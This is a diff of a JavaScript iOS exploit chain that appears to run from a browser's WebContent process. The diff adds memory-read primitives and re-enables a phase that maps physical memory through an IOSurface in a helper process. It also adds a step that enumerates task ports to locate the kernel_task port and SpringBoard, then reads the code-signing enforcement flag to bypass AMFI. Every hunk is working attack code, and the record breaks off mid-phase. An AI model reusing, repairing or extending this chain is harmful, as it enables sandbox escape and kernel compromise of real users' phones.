@@ -1,7 +1,7 @@
 (() => {
   sbx1_begin = Date.now();
   // Version marker to verify code is loaded from server, not browser cache
-  const VERSION = "2026-05-13-Phase0-COW-MME-v3";
+  const VERSION = "2026-05-14-v6-dlopen-CF";
   print(`[sbx1] VERSION: ${VERSION} - Build timestamp: ${new Date().toISOString()}`);
   const peCode = "&v={{LPE_64BITE}}";
   let wc_fcall = fcall;
@@ -19,7 +19,7 @@
   }
   // Log version at startup
   LOG(`VERSION: ${VERSION}`);
-  LOG(`Build: Phase0-COW-MME-v4 - Phase 0C optimized + Phase 0D PCB scan`);
+  LOG(`Build: v6 - dlopen CoreFoundation + fix KeyCallBacks deref + remove Width/H/PF`);
 
   let wc_get_cstring = function (js_str) {
     let s = js_str + "\x00";
@@ -6553,6 +6553,19 @@
     }
     return uread8(surface_address + 0x2100n);
   }
+  function mpd_read32_timeout(address) {
+    uwrite64(surface_address + 0x2100n, 0n);
+    let ret = mpd_fcall_timeout(MEMCPY, surface_address_remote + 0x2100n, address, 4n, 0n, 0n, 0n, 0n, 0n);
+    if (ret === MPD_FCALL_TIMED_OUT) {
+      return MPD_FCALL_TIMED_OUT;
+    }
+    return uread64(surface_address + 0x2100n) & 0xFFFFFFFFn;
+  }
+  function mpd_read32(address) {
+    uwrite64(surface_address + 0x2100n, 0n);
+    mpd_fcall(MEMCPY, surface_address_remote + 0x2100n, address, 4n, 0n, 0n, 0n, 0n, 0n);
+    return uread64(surface_address + 0x2100n) & 0xFFFFFFFFn;
+  }
   function mpd_write64_timeout(address, value) {
     uwrite64(surface_address + 0x2100n, value);
     return mpd_fcall_timeout(MEMCPY, address, surface_address_remote + 0x2100n, 8n, 0n, 0n, 0n, 0n, 0n);
@@ -7520,6 +7533,7 @@
 
       if (readback == new_val) {
         LOG("[M5] GPU KERNEL WRITE SUCCESS! We have kernel r/w via GPU!");
+        globalThis.GPU_WRITE_SUCCESS = true;
         // Restore original value
         try { uwrite64(test_addr, orig_val); } catch(e) {}
       } else if (readback == orig_val) {
@@ -7531,21 +7545,21 @@
       LOG("[M5] Cannot test — target value is FFs or 0, trying different offset");
     }
 
-    // ===== Phase 0A: SKIPPED (never provides useful data, mpd_read64 unreliable early on) =====
+    // ===== Phase 0A: COW verification =====
     globalThis.COW_SAFE = false;
-    if (false) { try {
+    if (globalThis.GPU_WRITE_SUCCESS) { try {
       let cow_orig = 0n;
-      try { cow_orig = uread64(cow_addr); } catch(e) {}
+      try { cow_orig = uread64(test_addr); } catch(e) {}
       if (cow_orig != 0n && cow_orig != 0xffffffffffffffffn) {
         let cow_modified = cow_orig ^ 0x2n; // flip bit 1 (non-destructive)
-        uwrite64(cow_addr, cow_modified);
-        let cow_gpu_readback = uread64(cow_addr);
+        uwrite64(test_addr, cow_modified);
+        let cow_gpu_readback = uread64(test_addr);
         LOG(`[0A] GPU readback: ${cow_gpu_readback.hex()} (expected ${cow_modified.hex()})`);
 
         // Read the same KC address from MPD's context using mpd_read64 directly
         // mpd_read64 does: memcpy(bounce_buf, address, 8) from MPD, then uread64(bounce_buf) from WebContent
         // Since KC data pages are mapped at the same VA in all processes, MPD should see the same page
-        let cow_mpd_val = mpd_read64(cow_addr);
+        let cow_mpd_val = mpd_read64_timeout(test_addr);
         LOG(`[0A] MPD read64 of same KC addr: ${cow_mpd_val.hex()}`);
 
         if (cow_mpd_val == cow_modified) {
@@ -7556,7 +7570,7 @@
           globalThis.COW_SAFE = false;
         } else {
           // Also try: read from a known IOSurface address to confirm mpd_read64 works at all
-          let diag_mpd = mpd_read64(surface_address_remote);
+          let diag_mpd = mpd_read64_timeout(surface_address_remote);
           LOG(`[0A] mpd_read64 sanity check (IOSurface base): ${diag_mpd.hex()}`);
           LOG(`[0A] UNEXPECTED: MPD read ${cow_mpd_val.hex()}, neither original(${cow_orig.hex()}) nor modified(${cow_modified.hex()})`);
           // If mpd_read64 is broken, we can't determine COW status
@@ -7566,7 +7580,7 @@
           globalThis.COW_SAFE = false;
         }
         // Restore original value
-        try { uwrite64(cow_addr, cow_orig); } catch(e) {}
+        try { uwrite64(test_addr, cow_orig); } catch(e) {}
       } else {
         LOG("[0A] COW test skipped: test_addr value is 0 or FFs");
       }
@@ -7575,8 +7589,9 @@
       globalThis.COW_SAFE = false;
     } }
 
-    // ===== Phase 0B: SKIPPED (never succeeds, corrupts fcall on timeout) =====
-    if (false) { try {
+    // ===== Phase 0B: PurpleGfxMem IOSurface — map physical memory =====
+    // Re-enabled: runs after P2/A2 (guarded by GPU_WRITE_SUCCESS && !PHYS_MEM_MAPPED)
+    if (globalThis.GPU_WRITE_SUCCESS && !globalThis.PHYS_MEM_MAPPED) { try {
       // First, resolve all the symbols we need in MPD context
       let MPD_CFDictionaryCreateMutable = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "CFDictionaryCreateMutable");
       let MPD_CFDictionarySetValue = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "CFDictionarySetValue");
@@ -7595,162 +7610,192 @@
       LOG(`[0B] mach_make_memory_entry_64: ${MPD_mach_make_memory_entry_64.hex()}`);
 
       if (MPD_CFDictionaryCreateMutable.noPAC() != 0n && MPD_IOSurfaceCreate.noPAC() != 0n && MPD_mach_make_memory_entry_64.noPAC() != 0n) {
+        // First, dlopen CoreFoundation in MPD so CF data symbols are accessible
+        LOG("[0B] dlopen CoreFoundation...");
+        mpd_fcall(DLOPEN, mpd_get_cstring("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation"), 2n);
+        LOG("[0B] dlopen CoreFoundation done");
+
         // Get kCFAllocatorDefault, kCFTypeDictionaryKeyCallBacks, kCFTypeDictionaryValueCallBacks, kIOSurfaceAllocSize in MPD
+        // kCFAllocatorDefault = dlsym → read value (it's a pointer global)
         let MPD_kCFAllocatorDefault = mpd_fcall(MPD_dlsym.noPAC(), 0xFFFFFFFFFFFFFFFEn, mpd_get_cstring("kCFAllocatorDefault"));
-        MPD_kCFAllocatorDefault = mpd_pacia(mpd_read64(MPD_kCFAllocatorDefault.noPAC()), 0xc2d0n);
+        LOG(`[0B] dlsym(kCFAllocatorDefault) = ${MPD_kCFAllocatorDefault.hex()}`);
+        if (MPD_kCFAllocatorDefault.noPAC() != 0n) {
+          MPD_kCFAllocatorDefault = mpd_read64(MPD_kCFAllocatorDefault.noPAC());
+        }
+        // kCFTypeDictionaryKeyCallBacks and ValueCallBacks are STRUCTS, not pointers.
+        // Original header.js uses func_resolve() directly WITHOUT uread64.
+        // The dlsym return value IS the address of the struct — pass directly to CFDictionaryCreateMutable.
         let MPD_kCFTypeDictionaryKeyCallBacks = mpd_fcall(MPD_dlsym.noPAC(), 0xFFFFFFFFFFFFFFFEn, mpd_get_cstring("kCFTypeDictionaryKeyCallBacks"));
-        MPD_kCFTypeDictionaryKeyCallBacks = mpd_pacia(mpd_read64(MPD_kCFTypeDictionaryKeyCallBacks.noPAC()), 0xc2d0n);
+        // DO NOT mpd_read64
         let MPD_kCFTypeDictionaryValueCallBacks = mpd_fcall(MPD_dlsym.noPAC(), 0xFFFFFFFFFFFFFFFEn, mpd_get_cstring("kCFTypeDictionaryValueCallBacks"));
-        MPD_kCFTypeDictionaryValueCallBacks = mpd_pacia(mpd_read64(MPD_kCFTypeDictionaryValueCallBacks.noPAC()), 0xc2d0n);
+        // DO NOT mpd_read64
+        // kIOSurfaceAllocSize = dlsym → read value (it's a CFStringRef pointer)
         let MPD_kIOSurfaceAllocSize = mpd_fcall(MPD_dlsym.noPAC(), 0xFFFFFFFFFFFFFFFEn, mpd_get_cstring("kIOSurfaceAllocSize"));
-        MPD_kIOSurfaceAllocSize = mpd_pacia(mpd_read64(MPD_kIOSurfaceAllocSize.noPAC()), 0xc2d0n);
+        LOG(`[0B] dlsym(kIOSurfaceAllocSize) = ${MPD_kIOSurfaceAllocSize.hex()}`);
+        if (MPD_kIOSurfaceAllocSize.noPAC() != 0n) {
+          MPD_kIOSurfaceAllocSize = mpd_read64(MPD_kIOSurfaceAllocSize.noPAC());
+        }
 
         LOG(`[0B] MPD_kCFAllocatorDefault: ${MPD_kCFAllocatorDefault.hex()}`);
+        LOG(`[0B] MPD_kCFTypeDictionaryKeyCallBacks (dlsym addr): ${MPD_kCFTypeDictionaryKeyCallBacks.hex()}`);
+        LOG(`[0B] MPD_kCFTypeDictionaryValueCallBacks (dlsym addr): ${MPD_kCFTypeDictionaryValueCallBacks.hex()}`);
+        LOG(`[0B] MPD_kIOSurfaceAllocSize: ${MPD_kIOSurfaceAllocSize.hex()}`);
 
-        // Get real task port from MPD
-        let real_task_port = mpd_fcall(MPD_mach_task_self.noPAC());
-        LOG(`[0B] mach_task_self() from MPD = ${real_task_port.hex()}`);
-
-        // Step 1: Create CFDictionary for PurpleGfxMem IOSurface
-        let dict = mpd_fcall_timeout(MPD_CFDictionaryCreateMutable.noPAC(), MPD_kCFAllocatorDefault, 0n, MPD_kCFTypeDictionaryKeyCallBacks, MPD_kCFTypeDictionaryValueCallBacks);
-        if (dict === MPD_FCALL_TIMED_OUT) {
-          LOG("[0B] CFDictionaryCreateMutable timed out");
-          dict = 0n;
+        // kCFAllocatorDefault resolved to 0x0 in MPD — CF accepts NULL as default allocator.
+        // Per CF convention, NULL allocator = kCFAllocatorDefault. Use 0n directly.
+        // Only abort if value is 0xFFFF... (genuinely corrupted)
+        if (MPD_kCFAllocatorDefault == 0xFFFFFFFFFFFFFFFFn) {
+          LOG(`[0B] kCFAllocatorDefault corrupted (all FFs) — aborting 0B`);
         } else {
-          LOG(`[0B] CFDictionaryCreateMutable: ${dict.hex()}`);
-        }
+          // Use 0n as allocator if kCFAllocatorDefault is 0 (CF treats NULL as default)
+          let alloc = MPD_kCFAllocatorDefault != 0n ? MPD_kCFAllocatorDefault : 0n;
+          // Get real task port from MPD
+          let real_task_port = mpd_fcall(MPD_mach_task_self.noPAC());
+          LOG(`[0B] mach_task_self() from MPD = ${real_task_port.hex()}`);
+          LOG(`[0B] Using allocator: ${alloc.hex()} (0=default CF allocator)`);
 
-        if (dict != 0n) {
-          // Add kIOSurfaceAllocSize = 0x40000 (256KB)
-          let size_buf = mpd_malloc(8n);
-          mpd_write64(size_buf, 0x40000n); // 256KB
-          let cf_number_size = mpd_fcall_timeout(MPD_CFNumberCreate.noPAC(), MPD_kCFAllocatorDefault, 9n, size_buf);
-          if (cf_number_size === MPD_FCALL_TIMED_OUT) {
-            LOG("[0B] CFNumberCreate timed out");
-            cf_number_size = 0n;
+          // Step 1: Create CFDictionary for PurpleGfxMem IOSurface
+          // NOTE: kCFTypeDictionaryKeyCallBacks/ValueCallBacks struct addresses passed DIRECTLY
+          // (NOT dereferenced — matching original header.js pattern)
+          let dict = mpd_fcall_timeout(MPD_CFDictionaryCreateMutable.noPAC(), alloc, 0n, MPD_kCFTypeDictionaryKeyCallBacks, MPD_kCFTypeDictionaryValueCallBacks);
+          if (dict === MPD_FCALL_TIMED_OUT) {
+            LOG("[0B] CFDictionaryCreateMutable timed out");
+            dict = 0n;
           } else {
-            LOG(`[0B] CFNumberCreate(size): ${cf_number_size.hex()}`);
+            LOG(`[0B] CFDictionaryCreateMutable: ${dict.hex()}`);
           }
 
-          if (cf_number_size != 0n) {
-            let res1 = mpd_fcall_timeout(MPD_CFDictionarySetValue.noPAC(), dict, MPD_kIOSurfaceAllocSize, cf_number_size);
-            if (res1 === MPD_FCALL_TIMED_OUT) {
-              LOG("[0B] CFDictionarySetValue(size) timed out");
+          if (dict != 0n) {
+            // Add kIOSurfaceAllocSize = 0x40000 (256KB)
+            let size_buf = mpd_malloc(8n);
+            mpd_write64(size_buf, 0x40000n); // 256KB
+            let cf_number_size = mpd_fcall_timeout(MPD_CFNumberCreate.noPAC(), alloc, 9n, size_buf);
+            if (cf_number_size === MPD_FCALL_TIMED_OUT) {
+              LOG("[0B] CFNumberCreate timed out");
+              cf_number_size = 0n;
             } else {
-              LOG(`[0B] CFDictionarySetValue(size): ${res1.hex()}`);
-            }
-          }
-
-          // Add IOSurfaceMemoryRegion = "PurpleGfxMem"
-          let cfstr_purplegfxmem = mpd_fcall_timeout(MPD_CFStringCreateWithCString.noPAC(), MPD_kCFAllocatorDefault, mpd_get_cstring("PurpleGfxMem"), 0n);
-          let cfstr_iosurfacememoryregion = mpd_fcall_timeout(MPD_CFStringCreateWithCString.noPAC(), MPD_kCFAllocatorDefault, mpd_get_cstring("IOSurfaceMemoryRegion"), 0n);
-          if (cfstr_purplegfxmem === MPD_FCALL_TIMED_OUT || cfstr_iosurfacememoryregion === MPD_FCALL_TIMED_OUT) {
-            LOG("[0B] CFStringCreateWithCString timed out");
-            cfstr_purplegfxmem = 0n;
-            cfstr_iosurfacememoryregion = 0n;
-          } else {
-            LOG(`[0B] CFStringCreate(PurpleGfxMem): ${cfstr_purplegfxmem.hex()}`);
-          }
-
-          if (cfstr_purplegfxmem != 0n) {
-            let res2 = mpd_fcall_timeout(MPD_CFDictionarySetValue.noPAC(), dict, cfstr_iosurfacememoryregion, cfstr_purplegfxmem);
-            if (res2 === MPD_FCALL_TIMED_OUT) {
-              LOG("[0B] CFDictionarySetValue(IOSurfaceMemoryRegion) timed out");
-            } else {
-              LOG(`[0B] CFDictionarySetValue(IOSurfaceMemoryRegion): ${res2.hex()}`);
-            }
-          }
-
-          // Step 2: Create IOSurface
-          let surface = mpd_fcall_timeout(MPD_IOSurfaceCreate.noPAC(), dict);
-          if (surface === MPD_FCALL_TIMED_OUT) {
-            LOG("[0B] IOSurfaceCreate timed out");
-            surface = 0n;
-          } else {
-            LOG(`[0B] IOSurfaceCreate: ${surface.hex()}`);
-          }
-
-          if (surface != 0n) {
-            // Release dict (we don't need it anymore) — only when surface was created
-            mpd_fcall_quick(MPD_CFRelease.noPAC(), dict);
-            // Step 3: Get physical_mapping_address
-            let physical_mapping_address = mpd_fcall_timeout(MPD_IOSurfaceGetBaseAddress.noPAC(), surface);
-            if (physical_mapping_address === MPD_FCALL_TIMED_OUT) {
-              LOG("[0B] IOSurfaceGetBaseAddress timed out");
-              physical_mapping_address = 0n;
-            } else {
-              LOG(`[0B] physical_mapping_address: ${physical_mapping_address.hex()}`);
+              LOG(`[0B] CFNumberCreate(size): ${cf_number_size.hex()}`);
             }
 
-            if (physical_mapping_address != 0n) {
-              // Step 4: Call mach_make_memory_entry_64 with physical_mapping_address as offset
-              let mme_size_buf = mpd_malloc(8n);
-              let mme_entry_buf = mpd_malloc(8n);
-              mpd_write64(mme_size_buf, 0x40000n); // 256KB
-              mpd_write64(mme_entry_buf, 0n);
+            if (cf_number_size != 0n) {
+              let res1 = mpd_fcall_timeout(MPD_CFDictionarySetValue.noPAC(), dict, MPD_kIOSurfaceAllocSize, cf_number_size);
+              if (res1 === MPD_FCALL_TIMED_OUT) {
+                LOG("[0B] CFDictionarySetValue(size) timed out");
+              } else {
+                LOG(`[0B] CFDictionarySetValue(size): ${res1.hex()}`);
+              }
+            }
 
-              // mach_make_memory_entry_64(task, size_ptr, offset, prot, mem_entry_ptr, parent_entry)
-              let mme_ret = mpd_fcall_timeout(MPD_mach_make_memory_entry_64.noPAC(),
-                real_task_port, mme_size_buf, physical_mapping_address,
-                VM_PROT_DEFAULT, mme_entry_buf, 0n, 0n, 0n);
-              let mme_entry = mpd_read64(mme_entry_buf);
-              let mme_size_val = mpd_read64(mme_size_buf);
-              LOG(`[0B] mach_make_memory_entry_64: ret=${mme_ret} entry=${mme_entry.hex()} size=${mme_size_val.hex()}`);
+            // Add IOSurfaceMemoryRegion = "PurpleGfxMem"
+            let cfstr_purplegfxmem = mpd_fcall_timeout(MPD_CFStringCreateWithCString.noPAC(), alloc, mpd_get_cstring("PurpleGfxMem"), 0n);
+            let cfstr_regionkey = mpd_fcall_timeout(MPD_CFStringCreateWithCString.noPAC(), alloc, mpd_get_cstring("IOSurfaceMemoryRegion"), 0n);
+            if (cfstr_purplegfxmem === MPD_FCALL_TIMED_OUT || cfstr_regionkey === MPD_FCALL_TIMED_OUT) {
+              LOG("[0B] CFStringCreateWithCString timed out");
+              cfstr_purplegfxmem = 0n;
+              cfstr_regionkey = 0n;
+            } else {
+              LOG(`[0B] CFStringCreate(PurpleGfxMem): ${cfstr_purplegfxmem.hex()}`);
+            }
 
-              if (mme_ret == 0n && mme_entry != 0n && mme_entry != 0xffffffffffffffffn) {
-                // Step 5: mach_vm_map to map it
-                let mvm_addr_buf = mpd_malloc(8n);
-                mpd_write64(mvm_addr_buf, 0n); // let kernel choose address
+            if (cfstr_purplegfxmem != 0n) {
+              let res2 = mpd_fcall_timeout(MPD_CFDictionarySetValue.noPAC(), dict, cfstr_regionkey, cfstr_purplegfxmem);
+              if (res2 === MPD_FCALL_TIMED_OUT) {
+                LOG("[0B] CFDictionarySetValue(IOSurfaceMemoryRegion) timed out");
+              } else {
+                LOG(`[0B] CFDictionarySetValue(IOSurfaceMemoryRegion): ${res2.hex()}`);
+              }
+            }
 
-                // mach_vm_map(target_task, addr_ptr, size, mask, flags, object, offset, copy, cur_prot, max_prot, inheritance)
-                let mvm_flags = VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR;
-                // WARNING: 0B passes 12 args but mpd_fcall only sees x0-x7
-                // x0=real_task_port, x1=mvm_addr_buf, x2=mme_size_val, x3=0, x4=mvm_flags, x5=mme_entry, x6=0, x7=0
-                // Args x8=VM_PROT_DEFAULT, x9=VM_PROT_DEFAULT, x10=VM_INHERIT_NONE, x11=0 are IGNORED
-                let mvm_ret = mpd_fcall_timeout(MPD_mach_vm_map.noPAC(),
-                  real_task_port, mvm_addr_buf, mme_size_val, 0n,
-                  mvm_flags, mme_entry, 0n,
-                  0n); // x7=copy=FALSE — x8-x11 ignored
-                if (mvm_ret === MPD_FCALL_TIMED_OUT) {
-                  LOG("[0B] mach_vm_map timed out");
-                } else {
-                  let mvm_addr = mpd_read64(mvm_addr_buf);
-                  LOG(`[0B] mach_vm_map: ret=${mvm_ret} addr=${mvm_addr.hex()}`);
+            // Step 2: Create IOSurface — using PurpleGfxMem (only needs AllocSize + MemoryRegion)
+            // Width/Height/PixelFormat NOT needed for PurpleGfxMem surfaces
+            let surface = mpd_fcall_timeout(MPD_IOSurfaceCreate.noPAC(), dict);
+            if (surface === MPD_FCALL_TIMED_OUT) {
+              LOG("[0B] IOSurfaceCreate timed out");
+              surface = 0n;
+            } else {
+              LOG(`[0B] IOSurfaceCreate: ${surface.hex()}`);
+            }
 
-                  if (mvm_ret == 0n && mvm_addr != 0n) {
-                    LOG("[0B] BREAKTHROUGH: SUCCESS: Mapped physical memory!");
-                    globalThis.MAPPED_MEM_ADDR = mvm_addr;
-                    globalThis.MEMORY_OBJECT_PORT = mme_entry;
-                    globalThis.PHYS_MEM_MAPPED = true;
-                    globalThis.MPD_TASK_PORT = real_task_port; // Save for 0C/0D reuse
-                    // Try to verify, but use timeout — mpd_read64 may hang if MPD page-faults
-                    // on the physically mapped memory
-                    let mapped_val = mpd_read64_timeout(mvm_addr);
-                    if (mapped_val === MPD_FCALL_TIMED_OUT) {
-                      LOG("[0B] Physical verify timed out — mapping exists but mpd_read64 hangs (MPD page fault)");
-                      LOG("[0B] Proceeding with PHYS_MEM_MAPPED=true, will use remap-based access");
-                    } else {
-                      LOG(`[0B] Mapped memory at ${mvm_addr.hex()}: ${mapped_val.hex()}`);
-                    }
+            if (surface != 0n) {
+              // Release dict now (surface created, we have a reference to it)
+              mpd_fcall_quick(MPD_CFRelease.noPAC(), dict);
+
+              // Step 3: Get physical_mapping_address
+              let physical_mapping_address = mpd_fcall_timeout(MPD_IOSurfaceGetBaseAddress.noPAC(), surface);
+              if (physical_mapping_address === MPD_FCALL_TIMED_OUT) {
+                LOG("[0B] IOSurfaceGetBaseAddress timed out");
+                physical_mapping_address = 0n;
+              } else {
+                LOG(`[0B] physical_mapping_address: ${physical_mapping_address.hex()}`);
+              }
+
+              if (physical_mapping_address != 0n) {
+                // Step 4: Call mach_make_memory_entry_64 with physical_mapping_address as offset
+                let mme_size_buf = mpd_malloc(8n);
+                let mme_entry_buf = mpd_malloc(8n);
+                mpd_write64(mme_size_buf, 0x40000n); // 256KB
+                mpd_write64(mme_entry_buf, 0n);
+
+                // mach_make_memory_entry_64(task, size_ptr, offset, prot, mem_entry_ptr, parent_entry)
+                let mme_ret = mpd_fcall_timeout(MPD_mach_make_memory_entry_64.noPAC(),
+                  real_task_port, mme_size_buf, physical_mapping_address,
+                  VM_PROT_DEFAULT, mme_entry_buf, 0n, 0n, 0n);
+                let mme_entry = mpd_read64(mme_entry_buf);
+                let mme_size_val = mpd_read64(mme_size_buf);
+                LOG(`[0B] mach_make_memory_entry_64: ret=${mme_ret} entry=${mme_entry.hex()} size=${mme_size_val.hex()}`);
+
+                if (mme_ret == 0n && mme_entry != 0n && mme_entry != 0xffffffffffffffffn) {
+                  // Step 5: mach_vm_map to map it
+                  let mvm_addr_buf = mpd_malloc(8n);
+                  mpd_write64(mvm_addr_buf, 0n); // let kernel choose address
+
+                  // mach_vm_map(target_task, addr_ptr, size, mask, flags, object, offset, copy, cur_prot, max_prot, inheritance)
+                  let mvm_flags = VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR;
+                  // WARNING: 0B passes 12 args but mpd_fcall only sees x0-x7
+                  // x0=real_task_port, x1=mvm_addr_buf, x2=mme_size_val, x3=0, x4=mvm_flags, x5=mme_entry, x6=0, x7=0
+                  // Args x8=VM_PROT_DEFAULT, x9=VM_PROT_DEFAULT, x10=VM_INHERIT_NONE, x11=0 are IGNORED
+                  let mvm_ret = mpd_fcall_timeout(MPD_mach_vm_map.noPAC(),
+                    real_task_port, mvm_addr_buf, mme_size_val, 0n,
+                    mvm_flags, mme_entry, 0n, 0n);
+                  if (mvm_ret === MPD_FCALL_TIMED_OUT) {
+                    LOG("[0B] mach_vm_map timed out");
                   } else {
-                    LOG(`[0B] mach_vm_map failed (ret=${mvm_ret})`);
+                    let mvm_addr = mpd_read64(mvm_addr_buf);
+                    LOG(`[0B] mach_vm_map: ret=${mvm_ret} addr=${mvm_addr.hex()}`);
+
+                    if (mvm_ret == 0n && mvm_addr != 0n) {
+                      LOG("[0B] BREAKTHROUGH: SUCCESS: Mapped physical memory!");
+                      globalThis.MAPPED_MEM_ADDR = mvm_addr;
+                      globalThis.MEMORY_OBJECT_PORT = mme_entry;
+                      globalThis.PHYS_MEM_MAPPED = true;
+                      globalThis.MPD_TASK_PORT = real_task_port;
+                      // Try to verify, but use timeout
+                      let mapped_val = mpd_read64_timeout(mvm_addr);
+                      if (mapped_val === MPD_FCALL_TIMED_OUT) {
+                        LOG("[0B] Physical verify timed out — mapping exists but mpd_read64 hangs");
+                        LOG("[0B] Proceeding with PHYS_MEM_MAPPED=true, will use remap-based access");
+                      } else {
+                        LOG(`[0B] Mapped memory at ${mvm_addr.hex()}: ${mapped_val.hex()}`);
+                      }
+                    } else {
+                      LOG(`[0B] mach_vm_map failed (ret=${mvm_ret})`);
+                    }
                   }
+                } else {
+                  LOG(`[0B] mach_make_memory_entry_64 failed (ret=${mme_ret})`);
                 }
               } else {
-                LOG(`[0B] mach_make_memory_entry_64 failed (ret=${mme_ret})`);
+                LOG("[0B] IOSurfaceGetBaseAddress returned null");
               }
+              mpd_fcall_quick(MPD_CFRelease.noPAC(), surface);
+              LOG("[0B] CFRelease done, proceeding to Phase 0C...");
             } else {
-              LOG("[0B] IOSurfaceGetBaseAddress returned null");
+              LOG("[0B] IOSurfaceCreate failed - returned null");
             }
-            // Release surface (use quick timeout — not critical, surface cleaned up on exit)
-            mpd_fcall_quick(MPD_CFRelease.noPAC(), surface);
-            LOG("[0B] CFRelease done, proceeding to Phase 0C...");
           } else {
-            LOG("[0B] IOSurfaceCreate failed - returned null");
+            LOG("[0B] CFDictionaryCreateMutable failed - returned null");
           }
-        } else {
-          LOG("[0B] CFDictionaryCreateMutable failed - returned null");
-        }
+        } // close if (!_0B_abort)
       } else {
         LOG("[0B] Missing required symbols (CFDictionaryCreateMutable or IOSurfaceCreate or mach_make_memory_entry_64)");
       }
@@ -8312,6 +8357,129 @@
     // A2 (below) bypasses AMFI without needing allproc.
     LOG("[M5] Phase 2: allproc scan SKIPPED (high-half VA unreachable via GPU, A2 handles AMFI bypass)");
 
+    // ===== Early resolve: mach_host_self + mach_task_self (replaces hardcoded ports) =====
+    // Use bare mpd_fcall (not timeout) — these are simple Mach traps that return instantly.
+    let mpd_host_port = 0n;
+    let mpd_task_port = 0n;
+    let mhs_sym_early = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_host_self");
+    let mts_sym_early = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_task_self");
+    if (mhs_sym_early.noPAC() != 0n) {
+        mpd_host_port = mpd_fcall(mhs_sym_early.noPAC());
+    }
+    if (mts_sym_early.noPAC() != 0n) {
+        mpd_task_port = mpd_fcall(mts_sym_early.noPAC());
+    }
+    LOG(`[M5] mach_host_self=${mpd_host_port.hex()} mach_task_self=${mpd_task_port.hex()}`);
+
+    // ===== P2: processor_set_tasks — bypass AMFI without kernel write =====
+    // Runs BEFORE A2 because it needs NO kernel write (pure Mach trap, no COW issue).
+    // If it succeeds (gets kernel_task port via Mach API), we have full kernel r/w.
+    {
+        let p2_success = false;
+        LOG("[P2] Attempting processor_set_tasks bypass (no kernel write needed)...");
+        let psd_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "processor_set_default");
+        let pst_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "processor_set_tasks");
+        LOG(`[P2] gpuDlsym(processor_set_default)=${psd_raw.hex()} processor_set_tasks=${pst_raw.hex()}`);
+
+        if (psd_raw.noPAC() != 0n && pst_raw.noPAC() != 0n && mpd_host_port != 0n) {
+            LOG(`[P2] Using dynamically resolved host port: ${mpd_host_port.hex()}`);
+
+            // Step 1: Get default processor set port
+            let pset_buf = mpd_malloc(8n);
+            mpd_write64(pset_buf, 0n);
+            let psd_ret = mpd_fcall_timeout(psd_raw.noPAC(), mpd_host_port, pset_buf, 0n, 0n, 0n, 0n, 0n, 0n);
+            if (psd_ret === MPD_FCALL_TIMED_OUT) { LOG("[P2] processor_set_default timed out"); psd_ret = -1n; }
+            let pset_port = mpd_read64_timeout(pset_buf);
+            if (pset_port === MPD_FCALL_TIMED_OUT) { LOG("[P2] mpd_read64(pset_buf) timed out"); pset_port = 0n; }
+            LOG(`[P2] processor_set_default = ${psd_ret} pset_port=${pset_port.hex()}`);
+
+            if (psd_ret == 0n && pset_port != 0n && pset_port != 0xffffffffffffffffn) {
+                // Step 2: Get all task ports from processor set
+                let task_array_buf = mpd_malloc(8n);
+                let task_count_buf = mpd_malloc(8n);
+                mpd_write64(task_array_buf, 0n);
+                mpd_write64(task_count_buf, 0n);
+                let pst_ret = mpd_fcall_timeout(pst_raw.noPAC(), pset_port, task_array_buf, task_count_buf, 0n, 0n, 0n, 0n, 0n);
+                let task_array = mpd_read64_timeout(task_array_buf);
+                if (task_array === MPD_FCALL_TIMED_OUT) { LOG("[P2] mpd_read64(task_array) timed out"); task_array = 0n; }
+                let task_count_raw = mpd_read64_timeout(task_count_buf);
+                let task_count = task_count_raw === MPD_FCALL_TIMED_OUT ? 0 : Number(task_count_raw);
+                LOG(`[P2] processor_set_tasks = ${pst_ret} array=${task_array.hex()} count=${task_count}`);
+
+                if (pst_ret == 0n && task_count > 0 && task_array != 0n) {
+                    LOG(`[P2] Got ${task_count} task ports! Scanning...`);
+                    let pid_for_task_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "pid_for_task");
+                    let kt_port = 0n;
+                    let sb_port = 0n;
+
+                    if (pid_for_task_raw.noPAC() != 0n) {
+                        for (let i = 0; i < task_count && i < 200; i++) {
+                            let port_raw = mpd_read32_timeout(task_array + BigInt(i) * 4n);
+                            if (port_raw === MPD_FCALL_TIMED_OUT) continue;
+                            let port = Number(port_raw);
+                            if (port == 0 || port == Number(mpd_host_port)) continue;
+                            let pid_buf = mpd_malloc(4n);
+                            mpd_write64(pid_buf, 0n);
+                            let pft_ret = mpd_fcall_timeout(pid_for_task_raw.noPAC(), BigInt(port), pid_buf, 0n, 0n, 0n, 0n, 0n, 0n);
+                            if (pft_ret === MPD_FCALL_TIMED_OUT) continue;
+                            let pid = Number(mpd_read32(pid_buf));
+                            if (i < 5 || pid == 0 || pid == 34) {
+                                LOG(`[P2] task[${i}] port=0x${port.toString(16)} pid=${pid}`);
+                            }
+                            if (pid == 0) { kt_port = BigInt(port); LOG(`[P2] FOUND kernel_task! port=0x${port.toString(16)}`); break; }
+                            if (pid == 34) { sb_port = BigInt(port); LOG(`[P2] FOUND SpringBoard! port=0x${port.toString(16)}`); }
+                        }
+                    } else {
+                        LOG("[P2] pid_for_task not resolved, trying mach_vm_read on each port (slow)...");
+                    }
+
+                    // If kernel_task port found, use Mach APIs for AMFI bypass
+                    if (kt_port != 0n && mach_vm_read_raw.noPAC() != 0n) {
+                        let mach_vm_write_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_vm_write");
+                        if (mach_vm_write_raw.noPAC() != 0n) {
+                            let csed_kc = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "cs_enforcement_disable");
+                            if (csed_kc.noPAC() != 0n) {
+                                let csed_addr = csed_kc.noPAC();
+                                let vmr_data = mpd_malloc(8n);
+                                let vmr_count = mpd_malloc(8n);
+                                mpd_write64(vmr_data, 0n); mpd_write64(vmr_count, 8n);
+                                let vmr_ret = mpd_fcall_timeout(mach_vm_read_raw.noPAC(), kt_port, csed_addr, 8n, vmr_data, vmr_count, 0n, 0n, 0n);
+                                if (vmr_ret == 0n) {
+                                    let dptr = mpd_read64(vmr_data);
